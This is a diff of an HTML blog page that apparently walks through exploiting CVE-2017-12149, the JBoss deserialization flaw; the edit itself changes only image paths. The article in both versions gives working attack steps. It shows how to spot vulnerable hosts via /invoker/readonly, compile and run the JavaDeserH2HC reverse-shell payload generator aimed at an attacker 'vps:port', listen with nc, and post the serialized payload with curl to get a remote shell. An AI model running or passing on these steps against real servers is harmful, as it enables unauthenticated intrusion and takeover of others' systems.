@@ -81,9 +81,9 @@
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
         <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>CVE编号：CVE-2017-12149<br>影响版本：影响版本为JBoss5.x-6.x<br>漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先我们要找到一个jboss搭建的网站，访问路径/invoker/readonly 出现500，那么说明可能存在漏洞<br><img src="/images/01.png" alt><br>以防万一，我们再使用jboss的检测工具，检测一下，发现存在jboss漏洞<br><img src="/images/02.png" alt></p>
-<p>下载利用工具：JavaDeserH2HC（<a href="http://scan.javasec.cn/java/JavaDeserH2HC.zip）" target="_blank" rel="noopener">http://scan.javasec.cn/java/JavaDeserH2HC.zip）</a><br>接下来输入命令：<br>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java<br>java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap +vps：port //反弹shell的IP和端口<br><img src="/images/03.png" alt><br>在本地监听端口：<br>nc -lvvp 1234</p>
-<p>再次执行以下命令：<br>curl <a href="http://ip:8080/invoker/readonly" target="_blank" rel="noopener">http://ip:8080/invoker/readonly</a> –data-binary @ReverseShellCommonsCollectionsHashMap.ser<br><img src="/images/04.png" alt><br>反弹成功</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先我们要找到一个jboss搭建的网站，访问路径/invoker/readonly 出现500，那么说明可能存在漏洞<br><img src="/img/01.png" alt><br>以防万一，我们再使用jboss的检测工具，检测一下，发现存在jboss漏洞<br>!<img src="/img/02.png" alt></p>
+<p>下载利用工具：JavaDeserH2HC（<a href="http://scan.javasec.cn/java/JavaDeserH2HC.zip）" target="_blank" rel="noopener">http://scan.javasec.cn/java/JavaDeserH2HC.zip）</a><br>接下来输入命令：<br>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java<br>java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap +vps：port //反弹shell的IP和端口<br><img src="/img/03.png" alt><br>在本地监听端口：<br>nc -lvvp 1234</p>
+<p>再次执行以下命令：<br>curl <a href="http://ip:8080/invoker/readonly" target="_blank" rel="noopener">http://ip:8080/invoker/readonly</a> –data-binary @ReverseShellCommonsCollectionsHashMap.ser<br><img src="/img/04.png" alt><br>反弹成功</p>
 
       
     </div>
